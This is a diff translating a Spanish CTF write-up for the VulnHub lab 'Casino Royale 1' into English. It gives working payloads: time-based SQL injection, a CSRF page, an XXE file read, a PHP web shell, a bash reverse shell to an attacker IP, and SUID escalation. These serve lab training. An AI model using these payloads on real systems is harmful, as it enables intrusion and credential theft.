@@ -1,9 +1,8 @@
-
 ---
 aliases: []
 tags:
   - writeup
-  - maquina
+  - machine
   - vulnhub
   - linux
   - sqli
@@ -13,32 +12,30 @@ tags:
   - rce
   - reverse-shell
   - suid
-maquina: Casino Royale 1
-plataforma: Linux
-dificultad: null
-fecha_resolucion: 2026-10-06
-tecnicas_clave:
+machine: Casino Royale 1
+platform: Linux
+difficulty: Intermediate
+date_solved: 2026-09-22
+key_techniques:
   - SQL injection
   - CSRF
   - XXE
   - FTP upload to RCE
   - SUID privilege escalation
 cve: []
-vector_inicial: Web application with cookie bypass and SQL injection
-escalada_privilegios: SUID binary mi6_detect_test runs bash -p
-autor: null
+initial_vector: Web application with cookie bypass and SQL injection
+privilege_escalation: SUID binary mi6_detect_test runs bash -p
+author: null
 writeup_url: https://www.vulnhub.com/entry/casino-royale-1,287/
-
----
 ---
 
-- **Máquina Casino Royale 1**: [https://www.vulnhub.com/entry/casino-royale-1,287/](https://www.vulnhub.com/entry/casino-royale-1,287/)
+- **Casino Royale 1 machine**: [https://www.vulnhub.com/entry/casino-royale-1,287/](https://www.vulnhub.com/entry/casino-royale-1,287/)
 
-## Reconocimiento:
+## Reconnaissance
 
 ### Arp-scan
 
-Escaneamos la tarjeta de red para ver cual es la ip de la máquina:
+We scan the network interface to find the machine's IP:
 ```bash 
 arp-scan -I ens33 --localnet
 ```
@@ -49,55 +46,55 @@ ping -c 1 192.168.18.237
 
 ### Nmap
 
-Ejecutamos el comando como administrador.
-Descubrimos los puertos abiertos.
+We run the command as administrator.
+This reveals the open ports.
 ```bash
 sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.18.237 -oG allPorts
 ```
 
-Una vez descubiertos los puertos, ejecutamos una serie de scripts sobre los puertos. *En este caso: 21, 25, 80, 8081*
+Once the ports are found, we run a set of scripts against them. *In this case: 21, 25, 80, 8081*
 
 ```bash
 nmap -sC -sV -p21,25,80,8081 192.168.18.237 -oN Targgeted
 ```
 
-Normalmente, dentro de los scripts predeterminado que usa nmap esta el *ftp-anon.nse* y como no nos ha dado ningún feedback, podemos concluir que el usuario *aanonymous* no esta disponible en el servicio ftp del puerto 21.
+Nmap's default scripts normally include *ftp-anon.nse*, and since it gave us no feedback, we can conclude that the *anonymous* user is not available on the FTP service on port 21.
 
-Con *ctrl + shift + t* abrimos otro espacio de trabajo mientras realizamos el scaneo. y con *ctrl + shift + alt + t* nombramos escaneo y reconocimiento, *ctrl + shift + w* para cerrar solo el espacio de trabajo actual.
+With *ctrl + shift + t* we open another workspace while the scan runs; with *ctrl + shift + alt + t* we name it "scan and recon", and *ctrl + shift + w* closes only the current workspace.
 
 ```bash
 nmap --script http-enum -p21,25,80,8081 192.168.18.237 -oN webScan 
 ```
-Este script actua como un fuzzer
+This script behaves like a fuzzer.
 
 ### Whatweb
-Ejecutamos el comando whatweb para ver que esta empleando la máquina.
+We run the whatweb command to see what the machine is running.
 ```bash
 whatweb http://192.168.1.146 -v
 ```
 
-Deberian salir versiones desactualizadas o propensas a ataques. Hay que documentarlo.
+Outdated or attack-prone versions should show up. Make sure to document them.
 
-### Página web
+### Website
 
-Encontramos un directorio *install/* en la parte de reconocimiento que parece vulnerable, al buscar en *searchsploit* podemos ver que la versión que tenemos, la *0.13* es justamente vulnerable a un Cookie Handling.
+During recon we find an *install/* directory that looks vulnerable; searching in *searchsploit* shows that our version, *0.13*, is in fact vulnerable to a Cookie Handling issue.
 ```bash
 searchsploit -x php/webapps/6766.txt
 ```
 
-Gracias el exploit, encontramos un *pokeradmin/* hacemos un *ctrl + shift + c* en el navegador y en la consola pegamos la línea para "setear" la cookie de admin. A continuación nos metemos en *pokeradmin/configure.php* y deberíamos tener acceso a todo.
+Thanks to the exploit we find a *pokeradmin/* path; we open the browser console with *ctrl + shift + c* and paste the line that sets the admin cookie. We then browse to *pokeradmin/configure.php* and should have full access.
 ```bash
 javascript:document.cookie = "ValidUserAdmin=admin";
 ```
 
-Con esto, ya tendriamos acceso, sin embargo vamos a abrir el burpsuite e interceptar la petición para ver si logramos cambiar la contraseña. 
-El formulario de inicio de sesión es vulnerable a SQLi, tras aplicarle un *admin' or 1=1-- -* nos deja entrar, y después de realizar un *admin' order by 7-- -* podemos deducir que hay 7 columnas. 
-Con las igualdades nos da unos problemas la página, al dar por válida tambien un *1=2-- -* con lo cuál nos montaremos un script en python de un SQLi basada en tiempo. Con comparaciones como la siguiente:
+That already gives us access, but let's open Burp Suite and intercept the request to see if we can change the password.
+The login form is vulnerable to SQLi: after injecting *admin' or 1=1-- -* it lets us in, and with *admin' order by 7-- -* we can tell there are 7 columns.
+Equality-based checks give us trouble because the page also treats *1=2-- -* as valid, so we build a Python script for a time-based SQLi, using comparisons like the following:
 ```bash
 op=adminlogin&username=admin' and if(substr(database(),1,1)='a',sleep(5),1)-- -&password=admin
 ```
 
-A la hora de montar el script, es necesario poner una cabecera llamada *Content-Type* porque si no la página no lo interpreta.
+When building the script we need to add a *Content-Type* header, otherwise the page won't process it.
 
 ```python
 #!/usr/python3
@@ -160,29 +157,29 @@ def sqli():
 if __name__=='__main__':
     sqli()
 ```
-con este script podemos sacar la palabra *pokerleague* y con algunos pequeños cambios en el script sacamos mas información, para las bases de datos cambiamos la linea 32 y 37.
+With this script we can extract the word *pokerleague*, and with a few small changes we get more information; to enumerate the databases we change lines 32 and 37.
 ```python
 'username': "admin' and if(substr((select group_concat(schema_name) from information_schema.schemata),%d,1)='%s',sleep(0.85),1)-- -" % (position, character),
 ```
-*Datos extraidos:  information_schema,mysql,performance_schema,phpmyadmin,pokerleague,vip*
+*Extracted data: information_schema,mysql,performance_schema,phpmyadmin,pokerleague,vip*
 
 ```python
 'username': "admin' and if(substr((select group_concat(table_name) from information_schema.table where table_schema='pokerleague'),%d,1)='%s',sleep(0.85),1)-- -" % (position, character),
 ```
-*Datos extraidos:  pokermax_admin,pokermax_players,pokermax_scores,pokermax_tournaments*
+*Extracted data: pokermax_admin,pokermax_players,pokermax_scores,pokermax_tournaments*
 
 ```python
 'username': "admin' and if(substr((select group_concat(column_name) from information_schema.columns where table_schema='pokerleague' and table_name='pokermax_admin'),%d,1)='%s',sleep(0.85),1)-- -" % (position, character),
 ```
-*Datos extraidos: id,username,password,league_name,league_information,league_email,league_tournament_director* Los que nos interesan son username y password
+*Extracted data: id,username,password,league_name,league_information,league_email,league_tournament_director* — the ones we care about are username and password.
 
 ```python
 'username': "admin' and if(substr((select group_concat(username,0x3a,password) from pokermax_admin),%d,1)='%s',sleep(0.85),1)-- -" % (position, character),
 ```
-*Datos extraidos: admin:raise12million* (Esta contraseña no es válida por ftp) 
-Cuando rebuscamos un poco de información en *Manage Players* encontramos a Valenka con una ruta (http://casino-royale.local/vip-client-portfolios/?uri=blog) que intenta cargar cosas del *casino-royale.local*, para que aparezcan las imágenes añadimos la ip de la máquina y la ruta de casino-royale.local al /etc/hosts.
-Una vez que todo carga vemos unas instrucciones para mandarle un correo a Valenka, con el asunto de un cliente conocido.
-Nos conectamos por telnet al puerto 25 que estaba abierto y empezamos a probar. No hay ningún tipo de verificación de correo. Asi que aprovechamos para montarnos un servidor en python por el puerto 80 y le mandamos un correo a ver si lo abre y nos sale.
+*Extracted data: admin:raise12million* (this password is not valid over FTP)
+Digging through *Manage Players* we find Valenka with a path (http://casino-royale.local/vip-client-portfolios/?uri=blog) that tries to load resources from *casino-royale.local*; to make the images show up we add the machine's IP and the casino-royale.local hostname to /etc/hosts.
+Once everything loads we see instructions to send Valenka an email with the subject of a known client.
+We connect over telnet to the open port 25 and start testing. There is no email verification at all, so we stand up a Python web server on port 80 and send an email to see if she opens it and reaches back to us.
 ```bash
 telnet 192.168.18.237 25
 Trying 192.168.18.237...
@@ -202,7 +199,7 @@ http://mi_ip/test.html
 .
 250 2.0.0 Ok: queued as A65D21D05
 ```
-En pocos segundos obtenemos una petición en el servidor del puerto 80, indicandonos que valenka abrió el Mail y que podemos proceder a hacer un pequeño script en .html. Además si buscamos en searchsploit el CMS actual del nuevo directorio (http://casino-royale.local/vip-client-portfolios/?uri=blog) encontramos un Cross-Site Request Forgery (CSRF) por html.
+Within seconds we get a hit on the port-80 server, telling us Valenka opened the email and that we can go ahead and craft a small .html script. On top of that, if we look up the CMS of the new directory (http://casino-royale.local/vip-client-portfolios/?uri=blog) in searchsploit we find an HTML-based Cross-Site Request Forgery (CSRF).
 
 ```html
 <html>
@@ -223,10 +220,10 @@ En pocos segundos obtenemos una petición en el servidor del puerto 80, indicand
   </body>
 </html>
 ```
-Ahora solo hay que conectarse otra vez y mandarle el archivo html.
+Now we just need to connect again and send her the HTML file.
 
-Una vez que con el html conseguimos nuestro propio usuario de administrador, podemos encontrar en la información de otro perfil llamado le, otra ruta del sistema que parece estar vulnerable a un xml. Cosa que podemos deducir por una filtración en el código fuente de la nueva página. (http://casino-royale.local//ultra-access-view/main.php).
-Para el xxe, abrimos la página web de Portswigger y el burpsuite, inteceptamos la petición del servidor vulnerable al xxe y cogemos la siguiente instrucción de Portswigger junto con la información que ya teniamos que se filtro de la página web en el código fuente y se la pegamos en el repeater para ver por ejemplo el */etc/passwd*.
+Once the HTML gives us our own admin user, in the profile of another user called "le" we find another system path that looks vulnerable to an XML attack, which we can tell from a leak in the source code of the new page (http://casino-royale.local//ultra-access-view/main.php).
+For the XXE we open the PortSwigger site and Burp Suite, intercept the request to the vulnerable endpoint, take the following payload from PortSwigger together with the info leaked in the page source, and paste it into Repeater to read, for example, */etc/passwd*.
 ```html
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
@@ -239,29 +236,29 @@ Para el xxe, abrimos la página web de Portswigger y el burpsuite, inteceptamos 
  </password>
 </creds>
 ```
-Al ver todo el */etc/passwd* no encontramos con un *ftpUserULTRA* que nos podria ser útil, pero no conocemos su contraseña. Podemos tirar de hydra y de Rockyou para realizar un ataque de fuerza bruta, llegando a la contraseña: *bankbank* en el puesto 48698 del diccionario.
+Reading the full */etc/passwd* we find an *ftpUserULTRA* that could be useful, but we don't know its password. We can use Hydra and Rockyou to brute-force it, reaching the password *bankbank* at position 48698 in the wordlist.
 ```bash
 hydra -l ftpUserULTRA -P /usr/share/wordlists/rockyou.txt ftp://192.168.18.237 -t 20
 ```
 
-Al conectarnos por ftp podemos subir un archivo .php para ejecutar comandos con el parámetro cmd.
+Once connected over FTP we can upload a .php file to run commands through the cmd parameter.
 ```php
 <?php
   system($_GET['cmd']);
 ?>
 ```
-Para subir el archivo tiene que ser php3 porque si no el servidor ftp lo bloquea.
-Una vez que esta subido el archivo le damos el permiso 777 y desde la url podremos controlar el parámetro cmd.
+The file has to be uploaded as php3, otherwise the FTP server blocks it.
+Once uploaded we give it permission 777 and can then control the cmd parameter from the URL.
 ```
 http://casino-royale.local/ultra-access-view/cmd.php3?cmd=whoami
 ```
 
-Nos ponemos en escucha por el puerto 443 desde la máquina atacante y creamos un *oneliner* en la url. Recuerda url-encodear los "&" con "%26".
+We start a listener on port 443 from the attacker machine and build a *one-liner* in the URL. Remember to URL-encode the "&" as "%26".
 ```
 http://casino-royale.local/ultra-access-view/cmd.php3?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.18.226/443%200%3E%261%22
 ```
 
-Una vez que la máquina víctima nos manda una bash al 443, le aplicamos un tratamiento de la tty
+Once the victim sends us a shell on 443, we upgrade the TTY:
 ```bash
 script /dev/null -c bash
 #ctrl + z
@@ -274,30 +271,30 @@ stty rows 44 columns 184
 
 ```
 
-### Escalado de privilegios
-Normalmente en servidores asi, existen unos archivos config que almacenan información sensible, asi que filtramos con find dichos archivos, para que realize un cat a todos los archivos que encuentre usamos un poco de sintaxis de find.
+### Privilege escalation
+On servers like this there are usually config files that store sensitive information, so we use find to locate them and cat every match with a bit of find syntax.
 ```bash
 find -name \*config\* 2>/dev/null -exec cat {} \; | less -S -r
 ```
 
-En un archivo de config encontramos una contraseña para el usuario valenka : *11archives11!*
-Existe un usuario valenka al que nos podemos conectar con un user-pivoting debido a una reutilización de credenciales.
+In one config file we find a password for the user valenka: *11archives11!*
+There is a valenka user we can pivot to thanks to credential reuse.
 
-Y para terminar buscamos desde la raíz archivos con privilegios SUID.
+Finally, we search from the root for files with the SUID bit set.
 ```bash
 find / -perm -4000 2>/dev/null
 ```
-Encontramos este archivo casualmente sospechoso que intenta ejecutar un script en bash: */opt/casino-royale/mi6_detect_test* 
-Asi que vamos a un directorio temporal, creamos el archivo y le damos permisos de ejecución.
+We find this conveniently suspicious file that tries to run a bash script: */opt/casino-royale/mi6_detect_test*
+So we go to a temporary directory, create the script and make it executable.
 ```bash
 #!/bin/bash
 
 bash -p
 ```
 
-Una vez estamos como root, vamos al directorio de la flag q curiosamente es un servicio web con lo cuál nos montamos un servicio web con php por cualquier puerto para compartir el index.php de la carpeta de la flag.
+Once we are root, we go to the flag directory, which is conveniently a web service, so we spin up a PHP web server on any port to serve the index.php of the flag folder.
 ```bash
 php -S 0.0.0.0:8084
 ```
 
-![[Pasted image 20260922120359.png]]
+![[Pasted image 20260922120359.png|Final flag served with php -S as root]]
